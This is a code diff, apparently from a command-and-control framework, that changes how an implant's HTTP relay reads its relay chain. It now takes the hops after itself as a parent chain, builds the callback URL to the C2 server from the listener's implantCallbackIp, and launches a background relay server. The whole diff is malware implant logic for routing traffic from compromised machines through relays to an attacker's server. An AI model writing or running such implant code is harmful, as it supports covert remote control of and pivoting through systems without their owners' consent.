@@ -1501,46 +1501,39 @@ proc httpHandler() {.async.} =
                             echo "[RELAY] 🚀 Starting HTTP relay server on runtime port: " & $port
                             echo "[RELAY] 🆔 Using implant GUID: " & listener.id
                         
-                        # Build C2 URL from listener config or extract from RELAY_CHAIN
+                        # Extract parent chain from RELAY_CHAIN (everything after the first hop, which is us)
                         const RELAY_CHAIN {.strdefine.}: string = ""
-                        var c2Url: string
+                        var c2Url: string = ""
                         var parentChain = ""
                         
-                        # If we have RELAY_CHAIN, extract C2 URL from the last hop
+                        # If we have RELAY_CHAIN, extract parent chain (everything after us)
                         when RELAY_CHAIN != "":
-                            parentChain = RELAY_CHAIN
                             when defined debug:
-                                echo "[RELAY] 🔗 Our RELAY_CHAIN: " & parentChain
+                                echo "[RELAY] 🔗 Our RELAY_CHAIN: " & RELAY_CHAIN
                             
-                            # The last hop in RELAY_CHAIN is the C2
                             # Clean and validate hops (trim whitespace, filter empties)
                             var cleanHops: seq[string] = @[]
-                            for hop in parentChain.split(","):
+                            for hop in RELAY_CHAIN.split(","):
                                 let trimmedHop = hop.strip()
                                 if trimmedHop.len > 0:
                                     cleanHops.add(trimmedHop)
                             
-                            if cleanHops.len > 0:
-                                let c2Hop = cleanHops[cleanHops.len - 1]
-                                
-                                # Check if hop already has protocol
-                                if c2Hop.startsWith("http://") or c2Hop.startsWith("https://"):
-                                    c2Url = c2Hop
-                                else:
-                                    # Use listener protocol if available, default to http
-                                    let protocol = if listener.listenerType != "": toLowerAscii(listener.listenerType) else: "http"
-                                    c2Url = protocol & "://" & c2Hop
+                            # Parent chain is everything AFTER the first hop (which should be us)
+                            if cleanHops.len > 1:
+                                # Skip the first hop (ourselves) and join the rest
+                                var restOfChain: seq[string] = @[]
+                                for i in 1..<cleanHops.len:
+                                    restOfChain.add(cleanHops[i])
+                                parentChain = restOfChain.join(",")
                                 
                                 when defined debug:
-                                    echo "[RELAY] 🎯 Extracted C2 URL from RELAY_CHAIN: " & c2Url
+                                    echo "[RELAY] 🔗 Parent chain (after us): " & parentChain
                             else:
-                                # Malformed RELAY_CHAIN, fall back to listener config
-                                c2Url = ""
                                 when defined debug:
-                                    echo "[RELAY] ⚠️  Malformed relay chain, falling back to listener config"
+                                    echo "[RELAY] ⚠️  RELAY_CHAIN only has one hop (us), no parent chain"
                         
-                        # Fallback to listener config if no RELAY_CHAIN or extraction failed
-                        if c2Url == "":
+                        # Build C2 URL only if we don't have RELAY_CHAIN (standard agent)
+                        when RELAY_CHAIN == "":
                             if listener.implantCallbackIp.startsWith("http://") or listener.implantCallbackIp.startsWith("https://"):
                                 # Use the full URL as-is (already has protocol)
                                 c2Url = listener.implantCallbackIp
@@ -1562,9 +1555,10 @@ proc httpHandler() {.async.} =
                                     echo "[RELAY] 🔧 Built C2 URL - Protocol: " & protocol & ", Host: " & host & ", Port: " & port
                         
                         when defined debug:
-                            echo "[RELAY] 🎯 Final C2 URL: " & c2Url
+                            if c2Url != "":
+                                echo "[RELAY] 🎯 C2 URL: " & c2Url
                             if parentChain != "":
-                                echo "[RELAY] 🔗 Final parent chain: " & parentChain
+                                echo "[RELAY] 🔗 Parent chain: " & parentChain
                         
                         # Start relay server in background (non-blocking)
                         let started = relay_launcher.startRelayServerWithPort(port, listener.id, parentChain, c2Url)
